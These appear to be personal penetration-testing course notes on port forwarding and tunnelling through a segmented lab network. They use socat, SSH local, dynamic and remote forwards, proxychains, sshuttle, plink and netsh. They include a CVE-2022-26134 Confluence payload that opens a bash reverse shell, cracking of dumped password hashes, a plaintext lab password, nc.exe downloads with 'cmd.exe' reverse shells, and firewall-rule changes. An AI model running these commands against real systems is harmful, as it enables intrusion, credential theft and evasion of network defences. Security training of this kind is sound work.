Why Port Redirection and Tunneling

Most network environments are not flat

more securely designed network is segmented (principle of least privilege)

subnets contain a group of devices that have a specific purpose, and devices on the subnet are only granted access to other subnets and hosts when necessary.

most admins will also implement controls that limit the flow of traffic

most common technologies is Firewalls
Linux iptable
Windows Defender Firewall

Firewall drop unwanted inbound packets and prevent malicious traffic and traversing or leaving the network

Most firewalls tend to allow or block traffic in line with rule based IP addresses and portnumber play book

Deep Packet Inspection monitors the contents of incoming and outgoing traffic and terminates based on another set of rules

Port redirection and tunneling are strategies we can use to traverse bounds

Port redirection mods the data flow by redirecting packets from one socket to another

Tunneling means encapsulating one type of data stream with another:
transporting HTTP within SSH so from the outside SSH will only be visible


Port Forwarding with Linux Tools

A Simple Scenario

suppose during assessment, linux web server is found to be running Confluence: CVE-2022-26134 -> pre auth remote code exe

server has 2 network interface, one attached to the network our machine is on, the other on an internal subnet

in the config we also find credentials and IP + Port for a PostgreSQL

WAN -> DMZ -> PostgreSQL


CVE-2022-26134 -> POC payload:
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/

verbose curl is being made to target, with URL encoded:
Hint: URL decode string by selecting Decode As > URL in the Decoder tab in burp

/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/

a std::tcp reverse shell which we can capture with nc

URL path is OGNL injection payload, Object-Graph Notation Language

after capturing the reverse shell with 1001 uid as confluence we can start enumerating network

ip addr
shows network interface

ip route
shows routing table

10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63

see that we can access hosts in localhost.50/24 subnet through ens192

and hosts in the 10.4.50.0/24 through ens224 (WAN)

poking around somemore we found plain text db credential

Problem here is that CONFLUENCE1 on the DMZ don't have PostgreSQL, and 1001 uid gip means that compromised host can't install the app either

we don have PostgreSQL on kali but it can't directly access what's behind the DMZ

assume that there is no firewall in place between kali and CONFLUENCE01, means binging ports on the WAN and connecting to them from kali is a vector


Port Forwarding With Socat

DMZ should be listening on a port with WAN interface and forward all packets to DB on the internal net

we'll need to open a TCP port on the DMZ then connect to the port from kali, we'll need all the packets we send from this port to be forwraded to the DB's 5432 port for PostgreSQL

Socat is a general-purpose networking tool, which means high likelyhood that it is already installed

On DMZ: we'll use Socat to config port forward, it will listen on a port on the WAN and forward packete to the LAN

socat -ddd TCP-LISTEN:<port>, fork TCP:<target DMZ>:5432

-ddd for verbose, listen on TCP port <port>, fork into a new subprocess when it receives a connection instead of dying after a single connection, and forward all traffic to TCP target DMZ on 5432

however do note that this is easy to detect with IDS/IPS, unusual listening ports or outbound connection from a non privileged service user will raise flags

with Socat running, we can run psql on kali, specifying that we want to connect to -h <DMZ> on -p <port> with postfres useraccount -U postgres

we'll run \l to list available database

after access:

we can continue enumeration, cwd_user table looks intresting:
\c confluence
to connect to the database

select * from cwd_user;
to review everything

after copying the password hashes from the db:

hashcat -m 12001 hashes.txt /usr/share/worlists/fasttrack.txt
12001 is for Atlassian

after obtaining the passworrds of the database_admin, hr_admin and rdp_admin

we can see that the password policy is not very strong, hence there is high porbability of password reuse

more enumeration shows that DB is running a ssh, so we can throw the credentials at the ssh

First we need to kill the original Socat process Listening, we'll create a new port forward with SSocat that will listen on another port and forward to TCP 22 on DB

socat TCP-LISTEN:2222, fork TCP:<DB>:22

from kali ssh client to connect to port 2222 on the DMZ as it is listening and will forward all packets to 22 on the DB anyway


SSH Tunneling

SSH Local Port Forwarding

SSH local port forwarding packets are not forwarded by the same host that listens for packets, instead ssh connection is made between two hosts, a listening port is opened by the ssh client and all packets received are then forwarded by the ssh server to the socket we specify

suppose the above senario, but Socaat is not available

with database_admin we can find that the DMZ is attached to another internal subnet, where we find a host with a DB server on 445

we'll plan to create ssh local port forward as part of the ssh connection from DMZ to DB, we'll bind listening port on WAN of DMZ, all packets sent to port will be forwarded through SSH, DB will then forward these towrads server

same way to access DMZ via the cURL RCE, but socat can no longer be userd for port forward

we can ssh directly from DMZ to DB

we need to know exactly which ip address and port we want the packets forwarded to

in shell from DMZ:

check for TTY function by using Python3 pty

python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh database_admin@10.4.50.215

now that we're in the DB, we can enumerate all over again

no nmap on the DB:
use this for subnet sacnning
for i in $(seq 1 254); do nc -zv -w 1 <subnet>.$i 445; done

for example:
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done

after ID, we'll also want to enumerate SMB on the host such that we can exfiltrate it 

1. use live off the land on DB, but it means we'll have to download SMB to DB and then download DB to attacker, very loud

2. we can ssh local port forward, create ssh connection from DMZ to DB as a port of connection, ssh local port forward would listen on 4455 on the WAN of DMZ, forwarding packets through ssh tunnel out of DB and directly into the SMB share

local port forward can be set up using openssh -l:
[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
LOCAL pair defines listening socket on the ssh client where packets will enter
DEST pair defines destination socket, where packets will exist

we'll do 0.0.0.0:445:<target ip>:445

ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
example command ran on DMZ

note that -N stops ssh from remote command exe, it is just a tunnel

once the chain is completed, use
ss -ntplu
to check

from the kali machine 
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
we can directly send request to the DMZ which will be forwarded to the DB and to the SMB


SSH Dynamic Port Forwarding

Local port forwarding: only connect to one socket per ssh

dynamic port forwarding -> SOCKS proxy, internal, software router

packets need to be properly formatted, 

ssh -N -D 0.0.0.0:<port> <username>@<target ip>
using the -D option to enable dynamic

for example:
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

slight problem here:
SOCKS proxy uses SOCKS protocol, but smbclient doesn't natively provide that

we'll need to use Proxychains: force network traffic from third party tools over HTTP or SOCKS

default configuration at:
/etc/proxychains4.conf

need to edit the config to ensure proxychains can locate socks proxy port and confrim the policy

proxies are at the end of the file, we'll replace the existing proxy definition in the file with something like:
sock5 <ip> <port>

socks5 192.168.50.63 9999

using smbclient with proxychains after edit are like this:
proxychains smbclient <command>

in general 
proxychins <command>

this now means we can use local kali tools on the internal network:
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217

running nmap at the internal subnet

*nmap does have --proxy, but offsec says it's still under development according to the documentation


SSH Remote Port Forwarding

in real world inbound traffic is controlled more compared to outbound traffic

outbound connections are more difficult to control comparred to inbound, corp net allow many types of common network traffic out, including ssh

ssh remote port forwarding connect back to an attacker controled ssh server and bind the listening port there

when compared to local and dynamic port forwarding the listening port is bound to ssh client, remote port forwarding the listening port is bound to the ssh server

using same senario as above, but with firewall

suppose:
DMZ connect to kali over shh, tcp port 2345 is bound to the loopback interface on kali, packets sent to 2345 are pushed back to DMZ via ssh tunnel -> DB

note that strong unique password is recommanded for kali machine

starting the ssh server:
sudo systemctl start ssh

check that ssh port is open
sudo ss -ntplu

escape restricted shell
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:<kali listen port>:<DB IP>:5432 kali@<my ip>
kali listen port can be what ever

since the ssh command follows this patter:
[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT

kali's target now becomes 127.0.0.1


SSH Remote Dynamic Port Forwarding

is dynamic port forwarding, but remote, so we'll be the host ssh server with dynamic connections to multiple IP and ports

suppose same senario, but with Windows server on the DMZ

to bind the SOCKS proxy to port 9998 on the loopback interface we need to specify -R <port> 

ssh -N -R 9998 kali@<my ip>
this uses the 9998 port

as with any dynamic ssh tunneling make sure to mod the 
/etc/proxychains4.conf


Using sshuttle

sshuttle is a tool that turns ssh connection into vpn like set up, it forces traffic through the ssh tunnel

it does need root on the client and python3 on the ssh server

first set up port forwarding in DMZ on 2222 of the WAN and forward to 22 on the DB

socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22

now on kali, we run sshuttle

sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

specifying the ssh connection string we use and subnets we tunnel though


Port forwarding with windows

ssh.exe

openssh is bundled since 1803, we can find scp.exe, sftp.exe, ssh.exe with other ssh-* in Windows\System32\OpenSSH

literally the same command as on linux because it's all openssh


Plink

Admin may avoid leaving OpenSSH on their windows machine

but admin do still need a remote admin tool

most network admin uses PuTTY and Plink before ssh was so avalible

tools that's popular with network admins means av will rarely flag it

assume above senario but reversed

/umbraco/forms.aspx webshell at

find / -name nc.exe 2>/dev/null
finding nc.exe for windows reverse netcat

powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
powershell command to grab the nc.exe to windows

we can then serve cmd to kali via
nc.exe -e cmd.exe <ip>:<port>

find / -name plink.exe 2>/dev/null
finds plink

server the plink

C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 <myip>
ssh tunneling with plink

and now we can rdp to 9833 via 127.0.0.1 on kali local shell and not the shell opened by plink's ssh tunnel


Netsh

Netsh is a built in firewall config tool which we can use to create port forward

we can set up port forward with portporxy subcontext with interface context

netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<localip> connectport=<targetport> connectaddress=<targetip>
establish the portforward tunnel

netstat -anp TCP | find "2222"
checking if it worked

note that firewall can be blocking the inbound so a hole need to be created
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=<localip> localport=2222 action=allow

make sure to plug it once we're done
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
